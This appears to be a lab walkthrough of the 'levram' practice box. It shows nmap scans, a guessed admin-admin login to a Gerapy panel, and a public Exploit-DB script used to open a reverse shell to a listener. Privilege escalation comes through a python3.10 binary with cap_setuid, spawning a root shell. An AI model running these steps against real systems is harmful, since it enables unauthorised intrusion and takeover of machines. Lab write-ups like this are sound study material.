# nmap
```
┌──(kali㉿kali)-[~/PG/levram]
└─$ nmap -p- --min-rate 10000 192.168.165.24            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-21 02:33 EST
Nmap scan report for 192.168.165.24
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 8.50 seconds
                                                                                                                                                     
┌──(kali㉿kali)-[~/PG/levram]
└─$ nmap -p 22,8000 -sCV 192.168.165.24  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-21 02:35 EST
Nmap scan report for 192.168.165.24
Host is up (0.042s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-title: Gerapy
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.52 seconds
```

![Pasted image 20250221153445](<0. Attachments/Pasted image 20250221153445.png>)
put one wrong port
![Pasted image 20250221153639](<0. Attachments/Pasted image 20250221153639.png>)

# Web Enum
![Pasted image 20250221153858](<0. Attachments/Pasted image 20250221153858.png>)

guessed admin-admin

![Pasted image 20250221153959](<0. Attachments/Pasted image 20250221153959.png>)

![Pasted image 20250221154128](<0. Attachments/Pasted image 20250221154128.png>)

![Pasted image 20250221154154](<0. Attachments/Pasted image 20250221154154.png>)

https://www.exploit-db.com/exploits/50640

# initial access
we first need to create a project
![Pasted image 20250221154719](<0. Attachments/Pasted image 20250221154719.png>)

then run exploit
![Pasted image 20250221154747](<0. Attachments/Pasted image 20250221154747.png>)
```
python3 50640.py -t 192.168.165.24 -p 8000 -L 192.168.45.225 -P 4444
```

have a nc listener ready
![Pasted image 20250221154852](<0. Attachments/Pasted image 20250221154852.png>)

shell upgrade
![Pasted image 20250221155019](<0. Attachments/Pasted image 20250221155019.png>)
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo ; fg ; reset;
```

# local.txt
![Pasted image 20250221155615](<0. Attachments/Pasted image 20250221155615.png>)
# priv esc enum

![Pasted image 20250221160545](<0. Attachments/Pasted image 20250221160545.png>)
`/usr/bin/write.ul (Unknown SGID binary)`

![Pasted image 20250221160654](<0. Attachments/Pasted image 20250221160654.png>)
`/usr/bin/python3.10 cap_setuid=ep`

![Pasted image 20250221161255](<0. Attachments/Pasted image 20250221161255.png>)

# priv esc
```
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

![Pasted image 20250221161537](<0. Attachments/Pasted image 20250221161537.png>)
